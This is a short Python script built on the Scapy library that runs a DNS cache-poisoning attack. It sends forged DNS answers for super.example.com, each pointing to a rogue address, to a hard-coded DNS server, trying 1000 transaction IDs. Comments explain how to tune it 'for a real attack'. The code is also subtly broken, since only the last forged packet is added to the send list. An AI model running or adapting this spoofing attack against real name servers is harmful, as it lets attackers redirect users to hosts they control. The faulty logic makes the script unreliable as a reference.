#!/usr/bin/python3
# sudo ./dns_fake_response.py
import scapy.all as sc
import time
sourceIP = '192.168.1.5'  # IP address of the attacking host
destIP = '83.212.80.118'  # IP address of the victim dns server

destPort = 53
sourcePort = 5353

spoofing_set = [x for x in range (1000)]

victim_host_name = "super.example.com"
rogueIP = '10.0.0.26'
udp_packets = []

for dns_trans_id in spoofing_set:
    udp_packet = (sc.IP(src=sourceIP, dst=destIP)
                  / sc.UDP(sport=sourcePort, dport=destPort)
                  / sc.DNS(id=dns_trans_id, rd=0, qr=1, ra=0, z=0, rcode=0,
                        qdcount=0, ancount=0, nscount=0, arcount=0,
                        qd=sc.DNSRR(rrname=victim_host_name, rdata=rogueIP,
                                 type="A", rclass="IN")))
udp_packets.append(udp_packet)
interval = 1
# Make it 0.001 for a real attack.
repeats = 2  # Give it a large value for a real attack
attempt = 0
while attempt < repeats:
    for udp_packet in udp_packets:
        sc.sr(udp_packet)
        time.sleep(interval)
        attempt += 1
